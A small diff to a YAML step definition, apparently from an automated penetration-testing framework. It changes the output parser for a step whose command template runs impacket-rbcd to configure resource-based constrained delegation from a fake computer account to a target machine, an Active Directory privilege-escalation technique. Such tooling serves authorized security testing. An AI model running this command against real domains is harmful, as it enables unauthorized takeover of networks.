@@ -11,7 +11,7 @@ parameters:
   fake_computer: from_finding.fake_computer
 command_template: impacket-rbcd '{domain}/{username}:{password}' -delegate-from '{fake_computer}$'
   -delegate-to '{target_computer}$' -dc-ip {target_ip} -action write
-parser: null
+parser: impacket_parser
 expected_effects:
 - delegation_configured
 falsifier:
